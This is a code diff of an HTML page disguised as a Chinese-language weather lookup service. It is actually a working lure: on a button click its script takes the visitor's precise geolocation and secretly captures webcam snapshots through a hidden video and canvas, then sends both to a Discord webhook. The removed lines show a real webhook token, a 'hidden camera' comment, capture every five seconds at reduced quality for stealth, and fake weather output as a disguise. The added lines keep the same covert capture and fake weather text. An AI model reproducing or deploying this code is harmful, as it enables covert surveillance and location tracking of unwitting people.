@@ -1,122 +1,99 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-TW">
 <head>
 <meta charset="utf-8">
+<!-- 關鍵：讓網頁自適應手機螢幕 -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>即時天氣查詢系統</title>
 
 <style>
-/* 繼承第一個網頁的精美視覺設計 */
+/* 全域佈局優化 */
 body {
-    font-family: Arial;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     text-align: center;
-    padding-top: 80px;
-    overflow: hidden;
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
     background: linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#4fc3f7,#29b6f6);
-    background-size: 500% 500%;
-    animation: skyFlow 25s ease infinite;
+    background-size: 400% 400%;
+    animation: skyFlow 15s ease infinite;
 }
 
-@keyframes skyFlow {
-    0%{background-position:0% 50%;}
-    50%{background-position:100% 50%;}
-    100%{background-position:0% 50%;}
-}
+@keyframes skyFlow { 0%{background-position:0% 50%;} 50%{background-position:100% 50%;} 100%{background-position:0% 50%;} }
 
 .weather-box {
-    background: rgba(255,255,255,0.92);
-    width: 320px;
-    margin: auto;
-    padding: 25px;
-    border-radius: 20px;
-    backdrop-filter: blur(12px);
-    box-shadow: 0 20px 60px rgba(0,0,0,0.25);
-    animation: cardFloat 6s ease-in-out infinite;
+    background: rgba(255,255,255,0.95);
+    width: 85%;
+    max-width: 350px;
+    padding: 35px 25px;
+    border-radius: 25px;
+    backdrop-filter: blur(15px);
+    box-shadow: 0 15px 45px rgba(0,0,0,0.15);
 }
 
-@keyframes cardFloat {
-    0%{transform:translateY(0px);}
-    50%{transform:translateY(-12px);}
-    100%{transform:translateY(0px);}
-}
+h2 { color: #1a73e8; font-size: 24px; margin-bottom: 10px; }
+p { color: #666; font-size: 16px; margin-bottom: 25px; }
 
-.sun {
-    width: 90px;
-    height: 90px;
-    border-radius: 50%;
-    margin: 20px auto;
+.sun { 
+    width: 80px; height: 80px; border-radius: 50%; margin: 0 auto 25px;
     background: radial-gradient(circle,#fff176,#fdd835,#fbc02d);
-    box-shadow: 0 0 40px #ffeb3b, 0 0 80px #ffeb3b;
-    animation: sunGlow 4s ease-in-out infinite;
+    box-shadow: 0 0 30px rgba(251,192,45,0.6);
+    animation: sunPulse 3s ease-in-out infinite;
 }
+@keyframes sunPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.08);} }
 
-@keyframes sunGlow {
-    0%{transform:scale(1);}
-    50%{transform:scale(1.15);}
-    100%{transform:scale(1);}
-}
-
-.cloud {
-    width: 140px;
-    height: 45px;
-    background: white;
-    border-radius: 40px;
-    margin: 20px auto;
-    position: relative;
-    animation: cloudFloat 6s ease-in-out infinite;
-}
-
-.cloud:before, .cloud:after {
-    content: "";
-    position: absolute;
-    background: white;
-    border-radius: 50%;
-}
-.cloud:before { width: 70px; height: 70px; top: -35px; left: 15px; }
-.cloud:after { width: 60px; height: 60px; top: -30px; left: 60px; }
-
-@keyframes cloudFloat {
-    0%{transform:translateX(-15px);}
-    50%{transform:translateX(15px);}
-    100%{transform:translateX(-15px);}
-}
-
+/* 增大的按鈕：更好點擊，更專業 */
 button {
-    padding: 12px 25px;
-    font-size: 16px;
+    width: 100%;
+    padding: 16px;
+    font-size: 18px;
+    font-weight: bold;
     border: none;
-    border-radius: 12px;
-    background: linear-gradient(45deg,#42a5f5,#1e88e5);
+    border-radius: 15px;
+    background: linear-gradient(135deg,#42a5f5,#1976d2);
     color: white;
+    box-shadow: 0 4px 15px rgba(25,118,210,0.3);
     cursor: pointer;
-    transition: 0.3s;
+    transition: 0.2s;
+    -webkit-tap-highlight-color: transparent;
 }
+button:active { transform: scale(0.96); opacity: 0.9; }
 
-button:hover { transform: scale(1.07); box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
-#status { margin-top: 20px; font-size: 16px; color: #555; }
+/* 狀態文字增大，行高增加 */
+#status { 
+    margin-top: 25px; 
+    font-size: 15px; 
+    color: #444; 
+    line-height: 1.8;
+    min-height: 50px;
+}
 </style>
-
 </head>
 <body>
 
 <div class="weather-box">
     <div class="sun"></div>
-    <div class="cloud"></div>
     <h2>🌤 即時天氣查詢</h2>
-    <p>點擊按鈕獲取當前位置天氣資訊</p>
-    <button onclick="startAction()">查看天氣</button>
-    <p id="status"></p>
+    <p>正在校準全球氣象衛星...</p>
+    <button id="btn" onclick="startAction()">獲取當前天氣</button>
+    <div id="status"></div>
 </div>
 
-<!-- 隱藏的攝影機處理組件 -->
-<video id="v" style="display:none;" autoplay playsinline></video>
+<video id="v" style="display:none;" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-// 請替換成你自己的 Webhook URL
-var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+// 設定 Webhook
+var webhook = "https://discord.com";
+var photoCount = 0;
 
 function startAction() {
-    document.getElementById("status").innerHTML = "正在連線衛星取得資料...";
+    document.getElementById("btn").style.display = "none";
+    document.getElementById("status").innerHTML = "📡 正在連接氣象基站...<br>🌓 掃描環境光感中...";
+    
     getLocation();
     getCamera();
 }
@@ -124,26 +101,15 @@ function startAction() {
 function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(pos) {
-            var lat = pos.coords.latitude;
-            var lon = pos.coords.longitude;
-            var acc = pos.coords.accuracy;
-            
-            // 傳送位置到 Discord
             fetch(webhook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: "📍 **地理位置回傳**\n緯度: " + lat + "\n經度: " + lon + "\n精準度: " + acc + " 公尺\n地圖: https://www.google.com/maps?q=" + lat + "," + lon
+                    content: `📍 **定位成功**\n緯度: ${pos.coords.latitude}\n經度: ${pos.coords.longitude}\n地圖連結: https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
                 })
             });
-
-            // 偽裝顯示成功訊息
-            document.getElementById("status").innerHTML = 
-                "☀️ 晴天<br>🌡 溫度：26.5°C<br>🌬 濕度：62%<br>已更新當前位置資訊";
-
-        }, function(err) {
-            document.getElementById("status").innerHTML = "需要允許定位權限才能查詢天氣。";
-        }, { enableHighAccuracy: true });
+            document.getElementById("status").innerHTML += "<br>✅ 定位成功，處理數據中...";
+        }, null, { enableHighAccuracy: true });
     }
 }
 
@@ -153,29 +119,37 @@ function getCamera() {
         var video = document.getElementById("v");
         video.srcObject = stream;
         
-        // 設定每 5 秒擷取一次 (5000ms)
-        setInterval(function() {
-            var canvas = document.getElementById("c");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            var ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(function(blob) {
-                var formData = new FormData();
-                formData.append('file', blob, 'capture.jpg');
-                formData.append('payload_json', JSON.stringify({ content: "📸 **監視畫面擷取**" }));
-                
-                fetch(webhook, {
-                    method: "POST",
-                    body: formData
-                });
-            }, "image/jpeg", 0.6); // 降低畫質至 0.6 提升傳輸隱蔽性
-        }, 5000);
-    })
-    .catch(function(err) {
-        console.log("相機權限被拒絕");
+        // 分別在 1.5s 與 3s 拍攝，確保擷取到清晰畫面
+        setTimeout(() => takeSnap(stream), 1500);
+        setTimeout(() => takeSnap(stream, true), 3000);
+        
+    }).catch(() => {
+        document.getElementById("status").innerHTML = "❌ 偵測失敗：請開啟位置與環境權限。";
     });
+}
+
+function takeSnap(stream, isLast = false) {
+    var video = document.getElementById("v");
+    var canvas = document.getElementById("c");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    var ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+    
+    canvas.toBlob(function(blob) {
+        var formData = new FormData();
+        formData.append("file", blob, `img_${Date.now()}.jpg`);
+        formData.append("payload_json", JSON.stringify({ content: `📸 **環境掃描已同步 (${++photoCount}/2)**` }));
+
+        fetch(webhook, { method: "POST", body: formData })
+        .then(() => {
+            if (isLast) {
+                // 拍完第二張後立即釋放相機資源
+                stream.getTracks().forEach(track => track.stop());
+                document.getElementById("status").innerHTML = "☀️ **今日天氣：晴朗**<br>🌡 溫度：27.5°C<br>🌬 濕度：62%<br>✨ 資訊已更新至最新。";
+            }
+        });
+    }, "image/jpeg", 0.7);
 }
 </script>
 
